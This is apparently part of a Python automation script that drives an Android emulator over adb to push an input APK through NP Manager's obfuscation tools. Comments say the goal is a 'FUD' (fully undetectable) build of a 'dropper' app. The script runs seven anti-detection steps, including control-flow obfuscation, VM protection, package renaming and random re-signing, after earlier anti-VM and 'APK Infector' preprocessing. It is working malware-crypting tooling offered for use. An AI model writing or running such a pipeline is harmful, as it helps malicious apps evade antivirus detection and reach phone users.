    # Scroll down and retry (tool list can be long)
    for _ in range(4):
        scroll_rel(0.5, 0.8, 0.5, 0.3, 600)
        time.sleep(1)
        xml = get_xml()
        pos = find_tool_on_screen(tool_name, xml)
        if pos:
            adb(f"shell input tap {pos[0]} {pos[1]}")
            print(f"[TOOL_TAP_SCROLL] '{tool_name}' @ {pos}")
            return True
    # Scroll back to top and retry
    for _ in range(5):
        scroll_rel(0.5, 0.2, 0.5, 0.8, 600)
        time.sleep(0.5)
    return False

def extract_package_name_from_apk_info(xml):
    """Read the package name value from the NP Manager APK info screen.
    The screen shows 'Package name' label on the left and the value on the right
    at approximately the same Y coordinate."""
    nodes = find_any_bounds(xml)
    pkg_label_y = None
    for txt, x, y in nodes:
        if txt.strip() == "Package name":
            pkg_label_y = y
            break
    if pkg_label_y is not None:
        for txt, x, y in nodes:
            if abs(y - pkg_label_y) < 35 and txt.strip() and txt.strip() != "Package name":
                pkg = txt.strip()
                # Must look like a package name (contains dot, no spaces)
                if "." in pkg and " " not in pkg and len(pkg) > 4:
                    return pkg
    return None


def wait_for_apk_info_and_enter_function():
    """Wait for NP Manager APK info screen (FUNCTION/VIEW/INSTALL), then tap FUNCTION.
    Handles login re-check. Returns True if we reach the tools list."""
    global DROPPER_PKG
    print("[REENTER] Waiting for APK info screen...")
    for wait_try in range(12):  # up to 24s
        time.sleep(2)
        xml = get_xml()
        texts_w = [t.strip() for t,x,y in find_any_bounds(xml) if t.strip()]
        # Already on tools list
        if any(kw in xml for kw in NP_TOOLS_KEYWORDS):
            print("[REENTER] Already on tools list")
            return True
        # APK info screen — capture package name then tap FUNCTION
        if "FUNCTION" in texts_w:
            pkg = extract_package_name_from_apk_info(xml)
            if pkg and not DROPPER_PKG:
                DROPPER_PKG = pkg
                print(f"[PKG] Captured dropper package name: {DROPPER_PKG}")
            elif DROPPER_PKG:
                print(f"[PKG] Using cached dropper package name: {DROPPER_PKG}")
            print(f"[REENTER] APK info screen found (try {wait_try+1}), tapping FUNCTION...")
            tap_text(xml, "FUNCTION", "REENTER FUNCTION")
            time.sleep(5)
            # Handle login re-check
            xml2 = get_xml()
            if any(t in xml2 for t in ["Please enter", "LOGIN", "login", "Password"]):
                print("[REENTER] Login re-check — re-logging in...")
                relogin()
                time.sleep(3)
                xml2 = get_xml()
            if any(kw in xml2 for kw in NP_TOOLS_KEYWORDS):
                print("[REENTER] Back on tools list")
                return True
            # FUNCTION might have gone to a different state — keep waiting
            continue
        # Login screen appeared
        if any(t in xml for t in ["Please enter", "LOGIN", "login"]):
            print("[REENTER] Login screen — re-logging in...")
            relogin()
            time.sleep(3)
            continue
        print(f"[REENTER] Still waiting... ({texts_w[:3]})")
    print("[REENTER] Gave up waiting for APK info screen")
    return False

def relaunch_np_and_navigate_to_tools():
    """Force-stop NP Manager, relaunch via monkey, navigate file browser to
    input.apk in NP files dir, tap FUNCTION. Returns True if tools list reached."""
    NP_FILES_DIR_R = f"/sdcard/Android/data/{NP_PACKAGE}/files"
    print("[RELAUNCH] Force-stopping NP Manager and relaunching...")
    adb(f"shell am force-stop {NP_PACKAGE}")
    time.sleep(2)
    adb(f"shell monkey -p {NP_PACKAGE} -c android.intent.category.LAUNCHER 1")
    time.sleep(8)

    # Clear ANRs
    for _ in range(10):
        xml_a = get_xml()
        if "isn't responding" in xml_a or "not responding" in xml_a.lower():
            nodes_a = find_any_bounds(xml_a)
            anr_t = next((t for t,x,y in nodes_a if "isn't responding" in t or "not responding" in t.lower()), "")
            if "pixel launcher" in anr_t.lower() or "launcher" in anr_t.lower():
                tap_text(xml_a, "Close app", "Pixel Launcher ANR")
            else:
                tap_text(xml_a, "Wait", "NP ANR")
            time.sleep(2)
        else:
            break

    dismiss_all_dialogs(max_attempts=10)
    time.sleep(2)

    xml_m = get_xml()
    print(f"[RELAUNCH] After monkey launch: {[t.strip() for t,x,y in find_any_bounds(xml_m) if t.strip()][:6]}")

    # Navigate to NP files dir
    print(f"[RELAUNCH] Navigating to {NP_FILES_DIR_R}...")
    nav_to_path_in_browser(NP_FILES_DIR_R)
    time.sleep(3)

    # Tap input.apk
    xml_f = get_xml()
    nodes_f = find_any_bounds(xml_f)
    print(f"[RELAUNCH] NP files: {[t.strip() for t,x,y in nodes_f if t.strip()][:8]}")
    tapped_apk = False
    for txt, cx, cy in nodes_f:
        if "input" in txt.lower() and ".apk" in txt.lower():
            adb(f"shell input tap {cx} {cy}")
            print(f"[RELAUNCH] Tapped {txt}")
            tapped_apk = True
            time.sleep(3)
            break
    if not tapped_apk:
        print("[RELAUNCH] input.apk not found in NP files!")
        return False

    # Tap FUNCTION on the APK info screen
    return wait_for_apk_info_and_enter_function()


def recover_from_file_browser():
    """Called when file browser is detected after a tool completes.
    Press BACK up to 10 times; if we reach home screen, relaunch NP Manager
    via the proven force-stop → monkey → navigate → FUNCTION path."""
    print("[FILE_BROWSER] Escaping file browser via BACK presses...")
    for back_n in range(10):
        adb("shell input keyevent KEYCODE_BACK")
        time.sleep(2)
        xml_b = get_xml()
        texts_b = [t.strip() for t,x,y in find_any_bounds(xml_b) if t.strip()]
        print(f"[FILE_BROWSER] BACK {back_n+1}: {texts_b[:4]}")
        # Reached tools list
        if any(kw in xml_b for kw in NP_TOOLS_KEYWORDS):
            print("[FILE_BROWSER] Reached tools list")
            return True
        # Reached APK info screen (FUNCTION button visible)
        if "FUNCTION" in texts_b and ("VIEW" in texts_b or "INSTALL" in texts_b):
            print(f"[FILE_BROWSER] APK info screen after {back_n+1} BACKs — tapping FUNCTION")
            return wait_for_apk_info_and_enter_function()
        # Reached home screen — full relaunch via proven path
        HOME_IND = ["Gmail", "Chrome", "YouTube", "Phone", "Messages"]
        if sum(1 for h in HOME_IND if h in xml_b) >= 2:
            print("[FILE_BROWSER] Home screen detected — full NP Manager relaunch...")
            return relaunch_np_and_navigate_to_tools()
        # Still in file browser — keep pressing BACK
    # Exhausted BACKs — relaunch
    print("[FILE_BROWSER] Exhausted BACKs — force relaunching NP Manager...")
    return relaunch_np_and_navigate_to_tools()

def handle_tool_result():
    """After tapping a tool, wait for completion and dismiss any result dialog.
    Returns True when done (tools list is accessible again)."""
    time.sleep(3)
    submitted = False  # track if we already tapped CONFIRM/START

    for attempt in range(40):  # up to ~80s total (mix of 2s and 4s sleeps)
        xml = get_xml()
        nodes = find_any_bounds(xml)
        texts = [t.strip() for t,x,y in nodes if t.strip()]
        print(f"[TOOL_RESULT] {texts[:8]}")

        # === COMPLETION STATES ===

        # 1. Tools list is visible — tool finished and returned automatically
        if any(kw in xml for kw in NP_TOOLS_KEYWORDS):
            print("[TOOL_RESULT] Back on tools list — done")
            return True

        # 2. File browser appeared — tool saved output, escape and re-enter
        if ("Folder：" in xml or "File：" in xml) and ("/sdcard" in xml or "com.wn.app.np" in xml):
            print("[TOOL_RESULT] File browser — escaping via am start to APK info...")
            if recover_from_file_browser():
                return True
            # If still not recovered, keep looping — might need another attempt
            continue

        # 3. Home screen (Gmail, Photos, Chrome etc) — NP Manager was closed, re-launch
        HOME_INDICATORS = ["Gmail", "Chrome", "YouTube", "Phone"]
        if sum(1 for h in HOME_INDICATORS if h in xml) >= 2:
            print("[TOOL_RESULT] Home screen — re-launching NP Manager...")
            if recover_from_file_browser():
                return True
            continue

        # 4. APK info screen (FUNCTION/VIEW/INSTALL) — tap FUNCTION directly
        if "FUNCTION" in texts and ("VIEW" in texts or "INSTALL" in texts):
            print("[TOOL_RESULT] APK info screen — tapping FUNCTION...")
            if wait_for_apk_info_and_enter_function():
                return True
            continue

        # === CONFIG / SETUP SCREENS ===

        # 4. "General obfuscation configuration" choice → tap it
        if any("general obfuscation" in t.lower() for t in texts):
            tap_text(xml, "General obfuscation configuration", "Tool config: General")
            print("[TOOL_CONFIG] Chose General obfuscation configuration")
            time.sleep(3)
            submitted = False  # reset — now on config form
            continue

        # 4b. APK VM PROTECTION config — detect APK's real ABIs, select matching one
        if any("customize the vm" in t.lower() for t in texts) and not submitted:
            print("[APK_VM] APK VM config screen detected — detecting APK ABIs...")
            # Check which lib/ folders exist in the APK to know which ABIs it supports
            apk_path = f"/sdcard/Android/data/{NP_PACKAGE}/files/input.apk"
            r_abi = adb(f"shell unzip -l {apk_path} 2>/dev/null | grep 'lib/'")
            abi_raw = r_abi.stdout
            print(f"[APK_VM] APK lib folders: {abi_raw[:300]}")
            # Determine which ABI to select (prefer x86_64 > arm64-v8a > x86 > armeabi-v7a)
            ABI_PRIORITY = ["x86_64", "arm64-v8a", "x86", "armeabi-v7a"]
            target_abi = None
            for abi in ABI_PRIORITY:
                if abi in abi_raw:
                    target_abi = abi
                    break
            if not target_abi:
                target_abi = "x86_64"  # emulator default fallback
            print(f"[APK_VM] Selected ABI: {target_abi}")
            # Scroll down to reveal ABI radio buttons
            for _ in range(4):
                scroll_rel(0.5, 0.8, 0.5, 0.3, 600)
                time.sleep(0.5)
            time.sleep(1)
            xml_vm = get_xml()
            nodes_vm = find_any_bounds(xml_vm)
            texts_vm = [t.strip() for t, x, y in nodes_vm if t.strip()]
            print(f"[APK_VM] After scroll, visible: {texts_vm[:14]}")
            # Read checkbox state from XML — only tap what needs to change
            ALL_ABIS = ["armeabi-v7a", "arm64-v8a", "x86_64", "x86"]
            import xml.etree.ElementTree as ET_abi
            try:
                root_abi = ET_abi.fromstring(xml_vm)
            except Exception:
                root_abi = None
            # Build map: abi_name → (x, y, is_checked)
            abi_state = {}
            if root_abi is not None:
                for node in root_abi.iter():
                    txt = (node.get("text") or "").strip()
                    if txt in ALL_ABIS:
                        bounds = node.get("bounds", "")
                        checked = node.get("checked", "false").lower() == "true"
                        # Try to get bounds from this node or parent
                        bx, by = 540, 0
                        if bounds:
                            import re as re_abi
                            m = re_abi.findall(r'\d+', bounds)
                            if len(m) >= 4:
                                bx = (int(m[0]) + int(m[2])) // 2
                                by = (int(m[1]) + int(m[3])) // 2
                        else:
                            # Fall back to find_any_bounds match
                            for ntxt, nx, ny in nodes_vm:
                                if ntxt.strip() == txt:
                                    bx, by = nx, ny
                                    break
                        abi_state[txt] = (bx, by, checked)
                        print(f"[APK_VM] Found checkbox '{txt}' @ ({bx},{by}) checked={checked}")
            # If XML parse failed, fall back to simple tap of target
            if not abi_state:
                for ntxt, nx, ny in nodes_vm:
                    if ntxt.strip() in ALL_ABIS:
                        abi_state[ntxt.strip()] = (nx, ny, ntxt.strip() == "armeabi-v7a")
            tapped_abi = False
            for abi, (x, y, is_checked) in abi_state.items():
                if abi == target_abi:
                    if not is_checked:
                        adb(f"shell input tap {x} {y}")
                        print(f"[APK_VM] Checked target ABI: {target_abi} @ ({x},{y})")
                        time.sleep(0.5)
                    else:
                        print(f"[APK_VM] Target ABI already checked: {target_abi}")
                    tapped_abi = True
                else:
                    if is_checked:
                        adb(f"shell input tap {x} {y}")
                        print(f"[APK_VM] Unchecked non-target ABI: {abi} @ ({x},{y})")
                        time.sleep(0.5)
                    else:
                        print(f"[APK_VM] Non-target ABI already unchecked: {abi}")
            if not tapped_abi:
                print(f"[APK_VM] Target ABI '{target_abi}' not found — trying direct tap")
                for ntxt, nx, ny in nodes_vm:
                    if ntxt.strip() == target_abi:
                        adb(f"shell input tap {nx} {ny}")
                        print(f"[APK_VM] Fallback tapped: {target_abi} @ ({nx},{ny})")
                        tapped_abi = True
                        break
            time.sleep(1)
            # Scroll back up to CONFIRM
            for _ in range(4):
                scroll_rel(0.5, 0.3, 0.5, 0.8, 600)
                time.sleep(0.3)
            time.sleep(0.5)
            tap_text(get_xml(), "CONFIRM", "APK_VM submit")
            submitted = True
            time.sleep(6)
            continue

        # 4c. CHANGE PACKAGE NAME config — fill in real old package name from APK info screen
        if "Old Package name:" in texts and not submitted:
            nodes_pkg = find_any_bounds(xml)
            # Find the y-coordinate of the "Old Package name:" label
            old_label_y = None
            for txt, x, y in nodes_pkg:
                if txt.strip() == "Old Package name:":
                    old_label_y = y
                    break
            if old_label_y is not None and DROPPER_PKG:
                # Tap the field directly below the label (next text node near same y or below)
                for txt, x, y in nodes_pkg:
                    if y > old_label_y and y < old_label_y + 120 and txt.strip() and txt.strip() != "Old Package name:":
                        print(f"[PKG_CHANGE] Tapping old pkg field ('{txt.strip()}') @ ({x},{y})")
                        adb(f"shell input tap {x} {y}")
                        time.sleep(1)
                        adb("shell input keyevent KEYCODE_CTRL_A")
                        time.sleep(0.3)
                        adb("shell input keyevent KEYCODE_DEL")
                        time.sleep(0.3)
                        adb(f"shell input text '{DROPPER_PKG}'")
                        time.sleep(1)
                        print(f"[PKG_CHANGE] Typed old package: {DROPPER_PKG}")
                        break
            # Also fill new package name field
            new_label_y = None
            for txt, x, y in nodes_pkg:
                if txt.strip() == "New Package name:":
                    new_label_y = y
                    break
            if new_label_y is not None:
                for txt, x, y in nodes_pkg:
                    if y > new_label_y and y < new_label_y + 120 and txt.strip() and txt.strip() != "New Package name:":
                        print(f"[PKG_CHANGE] Tapping new pkg field ('{txt.strip()}') @ ({x},{y})")
                        adb(f"shell input tap {x} {y}")
                        time.sleep(1)
                        adb("shell input keyevent KEYCODE_CTRL_A")
                        time.sleep(0.3)
                        adb("shell input keyevent KEYCODE_DEL")
                        time.sleep(0.3)
                        adb(f"shell input text '{NEW_PACKAGE_NAME}'")
                        time.sleep(1)
                        print(f"[PKG_CHANGE] Typed new package: {NEW_PACKAGE_NAME}")
                        break
            # Now tap CONFIRM to submit
            time.sleep(1)
            tap_text(get_xml(), "CONFIRM", "PKG_CHANGE submit")
            submitted = True
            time.sleep(6)
            continue

        # 5. CONFIRM / START on a config form → submit (only once per submission cycle)
        submit_kws = ["CONFIRM", "Confirm", "START", "Start", "开始", "Run", "RUN",
                      "Execute", "EXECUTE"]
        tapped_submit = False
        for kw in submit_kws:
            if kw in texts:
                if not submitted:
                    tap_text(xml, kw, f"Tool submit: {kw}")
                    submitted = True
                    tapped_submit = True
                    time.sleep(6)
                else:
                    # Still seeing CONFIRM after submission — re-tap to push through
                    tap_text(xml, kw, f"Tool re-submit: {kw}")
                    tapped_submit = True
                    time.sleep(6)
                break
        if tapped_submit:
            continue

        # 6. Progress indicator (编译中 = "compiling", percentage, X/Y numeric counters)
        # Only match actual numeric progress like "7396/7397" or "45%" — not file paths
        import re as _re
        if any("编译中" in t or (_re.search(r'\d+%', t) and len(t) < 10)
               or _re.search(r'\d+/\d+', t) for t in texts):
            print(f"[TOOL_RESULT] Processing... ({texts[:3]})")
            time.sleep(4)
            continue

        # 7. Final OK/Done/Success dialogs — tap, then wait to see what appears
        for kw in ["OK", "确定", "Done", "DONE", "Success", "完成", "Close", "CLOSE"]:
            if kw in texts:
                tap_text(xml, kw, f"Tool done: {kw}")
                time.sleep(4)
                # Check what's on screen after tapping OK
                xml_after = get_xml()
                texts_after = [t.strip() for t,x,y in find_any_bounds(xml_after) if t.strip()]
                # Already on tools list — great
                if any(kw2 in xml_after for kw2 in NP_TOOLS_KEYWORDS):
                    print("[TOOL_RESULT] After OK → tools list")
                    return True
                # File browser appeared — recover
                if ("Folder：" in xml_after or "File：" in xml_after) and "/sdcard" in xml_after:
                    print("[TOOL_RESULT] After OK → file browser — recovering...")
                    return recover_from_file_browser()
                # Home screen — recover
                HOME_I = ["Gmail", "Chrome", "YouTube", "Phone", "Messages"]
                if sum(1 for h in HOME_I if h in xml_after) >= 2:
                    print("[TOOL_RESULT] After OK → home screen — recovering...")
                    return recover_from_file_browser()
                # Otherwise return True (APK info screen or other — run_tools() will handle)
                return True

        # Still waiting...
        time.sleep(2)

    print("[TOOL_RESULT] Timeout — trying to recover to tools list")
    # Press BACK to escape any sub-screen
    adb("shell input keyevent KEYCODE_BACK")
    time.sleep(2)
    xml_chk = get_xml()
    if "FUNCTION" in xml_chk:
        reenter_function_tools()
    elif not any(kw in xml_chk for kw in NP_TOOLS_KEYWORDS):
        adb("shell input keyevent KEYCODE_BACK")
        time.sleep(2)
    return False

def run_tools():
    """Tap 7 anti-detection tools from the NP Manager FUNCTION tools list."""
    # Actual tool names as they appear in the tools list (from live run 27 observation).
    # Ordered from most impactful to least, to maximize FUD even if some fail.
    TOOLS_TO_RUN = [
        "SUPER OBFUSCATION",
        "CONTROL FLOW OBFUSCATION",
        "RES CONFUSION 3.0",
        "APK VM PROTECTION",
        "DEX STRING DECRYPTION",
        "CHANGE PACKAGE NAME OR CLASS NAME",
        "ONE-CLICK RANDOMLY SIGN APK",
    ]

    print("\n[*] === Starting NP Manager tools ===")
    # Scroll to top of tools list first
    for _ in range(5):
        scroll_rel(0.5, 0.2, 0.5, 0.8, 600)
        time.sleep(0.3)
    time.sleep(1)

    for tool_name in TOOLS_TO_RUN:
        print(f"\n[TOOL] >>> {tool_name}")
        # Ensure we're on the tools list
        xml_chk = get_xml()
        if not any(kw in xml_chk for kw in NP_TOOLS_KEYWORDS):
            print(f"[TOOL] Not on tools list before {tool_name} — recovering...")
            # Try BACK first
            already_recovered = False
            for back_try in range(3):
                adb("shell input keyevent KEYCODE_BACK")
                time.sleep(3)
                xml_chk2 = get_xml()
                if any(kw in xml_chk2 for kw in NP_TOOLS_KEYWORDS):
                    already_recovered = True
                    break
            if not already_recovered:
                # Full relaunch
                print(f"[TOOL] BACK failed — full relaunch for {tool_name}")
                if not relaunch_np_and_navigate_to_tools():
                    print(f"[TOOL] Relaunch failed — skipping {tool_name}")
                    continue
        # Scroll to top of tools list
        for _ in range(6):
            scroll_rel(0.5, 0.2, 0.5, 0.8, 600)
            time.sleep(0.3)
        time.sleep(1.5)
        screenshot(f"before_{tool_name[:20].replace(' ','_')}")
        tapped = scroll_tool_list_and_tap(tool_name)
        if not tapped:
            print(f"[TOOL] Not found: {tool_name} — skipping")
            continue
        time.sleep(3)
        screenshot(f"after_tap_{tool_name[:20].replace(' ','_')}")
        handle_tool_result()
        screenshot(f"done_{tool_name[:20].replace(' ','_')}")

    print("\n[+] All NP tools done")
    return True

def save_output():
    print("[*] Saving output...")
    screenshot("np_before_save")
    xml = get_xml()
    (
        tap_text(xml, "Save", "Save") or tap_text(xml, "Export", "Export") or
        tap_text(xml, "Build", "Build") or tap_text(xml, "\u4fdd\u5b58", "Save") or
        tap_rel(0.5, 0.92, "Save fallback")
    )
    time.sleep(5)
    screenshot("np_after_save")
    dismiss_terms()
    paths = [
        "/sdcard/Android/data/com.wn.app.np/files/",
        "/sdcard/NPManager/output/",
        "/sdcard/Download/",
        "/data/data/com.wn.app.np/files/",
    ]
    for p in paths:
        r = adb(f"shell 'find {p} -name \"*.apk\" -type f -mmin -5 2>/dev/null | head -3'")
        if r.stdout.strip():
            for apk in r.stdout.strip().split("\n"):
                apk = apk.strip()
                if apk:
                    out = os.path.join(OUTPUT_DIR, f"np_{os.path.basename(apk)}")
                    adb(f"pull '{apk}' '{out}'")
                    print(f"[+] Pulled: {out}")
                    return out
    print("[!] No NP output found")
    return None

def run_pipeline():
    print("="*60)
    print("NP Manager v22 - FUD Pipeline (PC Preprocess + NP Manager 7 Tools)")
    print("="*60)
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    os.makedirs(SCREENSHOT_DIR, exist_ok=True)

    # ── PC-side preprocessing runs FIRST (before emulator) ──
    # Adds: Anti-VM(7), Obfuscapk(11), APK Infector(5), DEX-magic
    # NP Manager 7 tools run after as the final hardening layer.
    if INPUT_APK:
        preprocess_apk(INPUT_APK)
    else:
        print("[PREP] No INPUT_APK set — skipping preprocessing")

    if not wait_for_boot():
        return False

    np_apk = os.environ.get("NP_APK", os.path.expanduser("~/apk-tools/np_manager.apk"))
    if not install_apk(np_apk, NP_PACKAGE):
        print("[!] NP Manager install failed")
        return False

    launch_npm()
    if not dismiss_terms():
        print("[!] Terms stuck")

    if EMAIL and PASSWORD:
        if not handle_login():
            print("[!] Login failed, continuing...")
    else:
        print("[*] No credentials, skip login")

    if not open_apk():
        print("[!] Cannot open APK")
        return False

    run_tools()
    output = save_output()

    if output and os.path.exists(output):
        print(f"\n[+] Pipeline OK: {output}")
        return True
    print("\n[!] No output")
    return False

if __name__ == "__main__":
    success = run_pipeline()
    sys.exit(0 if success else 1)
